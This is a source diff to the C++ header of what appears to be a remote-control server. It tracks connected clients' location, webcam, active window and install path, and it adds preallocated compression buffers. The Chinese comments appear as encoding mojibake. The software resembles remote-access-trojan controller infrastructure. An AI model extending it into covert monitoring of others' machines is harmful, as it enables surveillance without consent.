@@ -1,4 +1,4 @@
-#pragma once
+ï»¿#pragma once
 
 #include "stdafx.h"
 #include "common/mask.h"
@@ -17,26 +17,26 @@ std::string GetPeerName(SOCKET sock);
 std::string GetRemoteIP(SOCKET sock);
 
 enum {
-    ONLINELIST_IP = 0,          // IPµÄÁĞË³Ğò
-    ONLINELIST_ADDR,            // µØÖ·
-    ONLINELIST_LOCATION,        // µØÀíÎ»ÖÃ
-    ONLINELIST_COMPUTER_NAME,   // ¼ÆËã»úÃû/±¸×¢
-    ONLINELIST_OS,              // ²Ù×÷ÏµÍ³
+    ONLINELIST_IP = 0,          // IPçš„åˆ—é¡ºåº
+    ONLINELIST_ADDR,            // åœ°å€
+    ONLINELIST_LOCATION,        // åœ°ç†ä½ç½®
+    ONLINELIST_COMPUTER_NAME,   // è®¡ç®—æœºå/å¤‡æ³¨
+    ONLINELIST_OS,              // æ“ä½œç³»ç»Ÿ
     ONLINELIST_CPU,             // CPU
-    ONLINELIST_VIDEO,           // ÉãÏñÍ·(ÓĞÎŞ)
-    ONLINELIST_PING,            // PING(¶Ô·½µÄÍøËÙ)
-    ONLINELIST_VERSION,	        // °æ±¾ĞÅÏ¢
-    ONLINELIST_INSTALLTIME,     // °²×°Ê±¼ä
-    ONLINELIST_LOGINTIME,       // »î¶¯´°¿Ú
-    ONLINELIST_CLIENTTYPE,		// ¿Í»§¶ËÀàĞÍ
-    ONLINELIST_PATH,			// ÎÄ¼şÂ·¾¶
+    ONLINELIST_VIDEO,           // æ‘„åƒå¤´(æœ‰æ— )
+    ONLINELIST_PING,            // PING(å¯¹æ–¹çš„ç½‘é€Ÿ)
+    ONLINELIST_VERSION,	        // ç‰ˆæœ¬ä¿¡æ¯
+    ONLINELIST_INSTALLTIME,     // å®‰è£…æ—¶é—´
+    ONLINELIST_LOGINTIME,       // æ´»åŠ¨çª—å£
+    ONLINELIST_CLIENTTYPE,		// å®¢æˆ·ç«¯ç±»å‹
+    ONLINELIST_PATH,			// æ–‡ä»¶è·¯å¾„
     ONLINELIST_MAX,
 };
 
 enum {
     PARSER_WINOS = -2,
-    PARSER_FAILED = -1,			// ½âÎöÊ§°Ü
-    PARSER_NEEDMORE = 0,		// ĞèÒª¸ü¶àÊı¾İ
+    PARSER_FAILED = -1,			// è§£æå¤±è´¥
+    PARSER_NEEDMORE = 0,		// éœ€è¦æ›´å¤šæ•°æ®
 };
 
 typedef struct PR {
@@ -56,10 +56,10 @@ typedef struct PR {
 } PR;
 
 enum {
-    COMPRESS_UNKNOWN = -2,			// Î´ÖªÑ¹ËõËã·¨
-    COMPRESS_ZLIB = -1,				// ÒÔÇ°°æ±¾Ê¹ÓÃµÄÑ¹Ëõ·½·¨
-    COMPRESS_ZSTD = 0,				// µ±Ç°Ê¹ÓÃµÄÑ¹Ëõ·½·¨
-    COMPRESS_NONE = 1,				// Ã»ÓĞÑ¹Ëõ
+    COMPRESS_UNKNOWN = -2,			// æœªçŸ¥å‹ç¼©ç®—æ³•
+    COMPRESS_ZLIB = -1,				// ä»¥å‰ç‰ˆæœ¬ä½¿ç”¨çš„å‹ç¼©æ–¹æ³•
+    COMPRESS_ZSTD = 0,				// å½“å‰ä½¿ç”¨çš„å‹ç¼©æ–¹æ³•
+    COMPRESS_NONE = 1,				// æ²¡æœ‰å‹ç¼©
 };
 
 // Header parser: parse the data to make sure it's from a supported client.
@@ -121,7 +121,7 @@ protected:
         HeaderEncType encTyp = HeaderEncUnknown;
         FlagType flagType = CheckHead(szPacketFlag, encTyp);
         if (flagType == FLAG_UNKNOWN) {
-            // Êı¾İ³¤¶È + Í¨ĞÅÃÜÂë [4×Ö½ÚÆô¶¯Ê±¼ä+4¸ö0×Ö½Ú+ÃüÁî±êÊ¶+ÏµÍ³Î»Êı±êÊ¶]
+            // æ•°æ®é•¿åº¦ + é€šä¿¡å¯†ç  [4å­—èŠ‚å¯åŠ¨æ—¶é—´+4ä¸ª0å­—èŠ‚+å‘½ä»¤æ ‡è¯†+ç³»ç»Ÿä½æ•°æ ‡è¯†]
             const BYTE* ptr = (BYTE*)buf.GetBuffer(0), * p = ptr + 4;
             int length = *((int*)ptr);
             int excepted = buf.GetBufferLength();
@@ -129,7 +129,7 @@ protected:
                 p[6] == 0 && p[7] == 0 && p[8] == 202 && (p[9] == 0 || p[9] == 1)) {
                 m_nFlagType = FLAG_WINOS;
                 compressMethod = COMPRESS_NONE;
-                memcpy(m_szPacketFlag, p, 10); // Í¨ĞÅÃÜÂë
+                memcpy(m_szPacketFlag, p, 10); // é€šä¿¡å¯†ç 
                 m_nCompareLen = 0;
                 m_nFlagLen = 0;
                 m_nHeaderLen = 14;
@@ -240,14 +240,14 @@ protected:
         return m_Encoder2;
     }
 private:
-    BOOL				m_bParsed;					// Êı¾İ°üÊÇ·ñ¿ÉÒÔ½âÎö
-    int					m_nHeaderLen;				// Êı¾İ°üµÄÍ·³¤¶È
-    int					m_nCompareLen;				// ±È¶Ô×Ö½ÚÊı
-    int					m_nFlagLen;					// ±êÊ¶³¤¶È
-    FlagType			m_nFlagType;				// ±êÊ¶ÀàĞÍ
-    char				m_szPacketFlag[32];			// ¶Ô±ÈĞÅÏ¢
-    Encoder*			m_Encoder;					// ±àÂëÆ÷
-    Encoder*			m_Encoder2;					// ±àÂëÆ÷2
+    BOOL				m_bParsed;					// æ•°æ®åŒ…æ˜¯å¦å¯ä»¥è§£æ
+    int					m_nHeaderLen;				// æ•°æ®åŒ…çš„å¤´é•¿åº¦
+    int					m_nCompareLen;				// æ¯”å¯¹å­—èŠ‚æ•°
+    int					m_nFlagLen;					// æ ‡è¯†é•¿åº¦
+    FlagType			m_nFlagType;				// æ ‡è¯†ç±»å‹
+    char				m_szPacketFlag[32];			// å¯¹æ¯”ä¿¡æ¯
+    Encoder*			m_Encoder;					// ç¼–ç å™¨
+    Encoder*			m_Encoder2;					// ç¼–ç å™¨2
     PkgMask*			m_Masker;
 };
 
@@ -315,7 +315,7 @@ public:
 class context
 {
 public:
-    // ´¿Ğéº¯Êı
+    // çº¯è™šå‡½æ•°
     virtual VOID InitMember(SOCKET s, Server* svr)=0;
     virtual BOOL Send2Client(PBYTE szBuffer, ULONG ulOriginalLength) = 0;
     virtual CString GetClientData(int index)const = 0;
@@ -342,6 +342,9 @@ public:
     }
 };
 
+// é¢„åˆ†é…è§£å‹ç¼©ç¼“å†²åŒºå¤§å°
+#define PREALLOC_DECOMPRESS_SIZE (4 * 1024)
+
 typedef class CONTEXT_OBJECT : public context
 {
 public:
@@ -351,6 +354,9 @@ public:
             ikcp_release(kcp);
             kcp = nullptr;
         }
+        FreeDecompressBuffer();
+        FreeCompressBuffer();
+        FreeSendCompressBuffer();
     }
     CString  sClientInfo[ONLINELIST_MAX];
     CString  additonalInfo[RES_MAX];
@@ -358,23 +364,94 @@ public:
     WSABUF   wsaInBuf;
     WSABUF	 wsaOutBuffer;
     char     szBuffer[PACKET_LENGTH];
-    CBuffer				InCompressedBuffer;	        // ½ÓÊÕµ½µÄÑ¹ËõµÄÊı¾İ
-    CBuffer				InDeCompressedBuffer;	    // ½âÑ¹ºóµÄÊı¾İ
+    CBuffer				InCompressedBuffer;	        // æ¥æ”¶åˆ°çš„å‹ç¼©çš„æ•°æ®
+    CBuffer				InDeCompressedBuffer;	    // è§£å‹åçš„æ•°æ®
     CBuffer             OutCompressedBuffer;
     HWND				hWnd;
     HANDLE              hDlg;
     OVERLAPPEDPLUS*		olps;						// OVERLAPPEDPLUS
-    int					CompressMethod;				// Ñ¹ËõËã·¨
-    HeaderParser		Parser;						// ½âÎöÊı¾İĞ­Òé
-    uint64_t			ID;							// Î¨Ò»±êÊ¶
+    int					CompressMethod;				// å‹ç¼©ç®—æ³•
+    HeaderParser		Parser;						// è§£ææ•°æ®åè®®
+    uint64_t			ID;							// å”¯ä¸€æ ‡è¯†
 
-    BOOL				m_bProxyConnected;			// ´úÀíÊÇ·ñÁ¬½Ó
-    BOOL 				bLogin;						// ÊÇ·ñ login
-    std::string			PeerName;					// ¶Ô¶ËIP
-    Server*				server;						// ËùÊô·şÎñ¶Ë
-    ikcpcb*				kcp = nullptr;				// ĞÂÔö£¬Ö¸ÏòKCP»á»°
-    std::string			GroupName;					// ·Ö×éÃû³Æ
+    BOOL				m_bProxyConnected;			// ä»£ç†æ˜¯å¦è¿æ¥
+    BOOL 				bLogin;						// æ˜¯å¦ login
+    std::string			PeerName;					// å¯¹ç«¯IP
+    Server*				server;						// æ‰€å±æœåŠ¡ç«¯
+    ikcpcb*				kcp = nullptr;				// æ–°å¢ï¼ŒæŒ‡å‘KCPä¼šè¯
+    std::string			GroupName;					// åˆ†ç»„åç§°
     CLock               SendLock;                   // fix #214
+
+    // é¢„åˆ†é…çš„è§£å‹ç¼©ç¼“å†²åŒºï¼Œé¿å…é¢‘ç¹å†…å­˜åˆ†é…
+    PBYTE               DecompressBuffer = nullptr;
+    ULONG               DecompressBufferSize = 0;
+    // é¢„åˆ†é…çš„å‹ç¼©æ•°æ®ç¼“å†²åŒºï¼ˆæ¥æ”¶æ—¶è§£å‹å‰ï¼‰
+    PBYTE               CompressBuffer = nullptr;
+    ULONG               CompressBufferSize = 0;
+    // é¢„åˆ†é…çš„å‘é€å‹ç¼©ç¼“å†²åŒºï¼ˆå‘é€æ—¶å‹ç¼©åï¼‰
+    PBYTE               SendCompressBuffer = nullptr;
+    ULONG               SendCompressBufferSize = 0;
+
+    // è·å–æˆ–åˆ†é…è§£å‹ç¼©ç¼“å†²åŒº
+    PBYTE GetDecompressBuffer(ULONG requiredSize)
+    {
+        if (DecompressBuffer == nullptr || DecompressBufferSize < requiredSize) {
+            FreeDecompressBuffer();
+            // åˆ†é…æ—¶é¢„ç•™ä¸€äº›ä½™é‡ï¼Œå‡å°‘é‡æ–°åˆ†é…æ¬¡æ•°
+            DecompressBufferSize = max(requiredSize, PREALLOC_DECOMPRESS_SIZE);
+            DecompressBuffer = new BYTE[DecompressBufferSize];
+        }
+        return DecompressBuffer;
+    }
+
+    void FreeDecompressBuffer()
+    {
+        if (DecompressBuffer) {
+            delete[] DecompressBuffer;
+            DecompressBuffer = nullptr;
+            DecompressBufferSize = 0;
+        }
+    }
+
+    // è·å–æˆ–åˆ†é…å‹ç¼©æ•°æ®ç¼“å†²åŒºï¼ˆç”¨äºæ¥æ”¶æ—¶å­˜æ”¾è§£å‹å‰çš„æ•°æ®ï¼‰
+    PBYTE GetCompressBuffer(ULONG requiredSize)
+    {
+        if (CompressBuffer == nullptr || CompressBufferSize < requiredSize) {
+            FreeCompressBuffer();
+            CompressBufferSize = max(requiredSize, PREALLOC_DECOMPRESS_SIZE);
+            CompressBuffer = new BYTE[CompressBufferSize];
+        }
+        return CompressBuffer;
+    }
+
+    void FreeCompressBuffer()
+    {
+        if (CompressBuffer) {
+            delete[] CompressBuffer;
+            CompressBuffer = nullptr;
+            CompressBufferSize = 0;
+        }
+    }
+
+    // è·å–æˆ–åˆ†é…å‘é€ç”¨å‹ç¼©ç¼“å†²åŒºï¼ˆç”¨äºå‘é€æ—¶å­˜æ”¾å‹ç¼©åçš„æ•°æ®ï¼‰
+    PBYTE GetSendCompressBuffer(ULONG requiredSize)
+    {
+        if (SendCompressBuffer == nullptr || SendCompressBufferSize < requiredSize) {
+            FreeSendCompressBuffer();
+            SendCompressBufferSize = max(requiredSize, PREALLOC_DECOMPRESS_SIZE);
+            SendCompressBuffer = new BYTE[SendCompressBufferSize];
+        }
+        return SendCompressBuffer;
+    }
+
+    void FreeSendCompressBuffer()
+    {
+        if (SendCompressBuffer) {
+            delete[] SendCompressBuffer;
+            SendCompressBuffer = nullptr;
+            SendCompressBufferSize = 0;
+        }
+    }
 
     std::string GetProtocol() const override
     {
@@ -516,7 +593,7 @@ public:
                 SAFE_DELETE_ARRAY(szBuffer);
         }
     }
-    // Read compressed buffer.
+    // Read compressed buffer. ä½¿ç”¨é¢„åˆ†é…ç¼“å†²åŒºï¼Œé¿å…é¢‘ç¹å†…å­˜åˆ†é…
     PBYTE ReadBuffer(ULONG& dataLen, ULONG& originLen)
     {
         if (Parser.IsParsed()) {
@@ -530,7 +607,8 @@ public:
                 InCompressedBuffer.ReadBuffer((PBYTE)&originLen, sizeof(ULONG));
             }
             dataLen = totalLen - Parser.GetHeaderLen();
-            PBYTE CompressedBuffer = new BYTE[dataLen];
+            // ä½¿ç”¨é¢„åˆ†é…ç¼“å†²åŒºæ›¿ä»£æ¯æ¬¡ new
+            PBYTE CompressedBuffer = GetCompressBuffer(dataLen);
             InCompressedBuffer.ReadBuffer(CompressedBuffer, dataLen);
             Decode2(CompressedBuffer, dataLen, szPacketFlag);
             return CompressedBuffer;
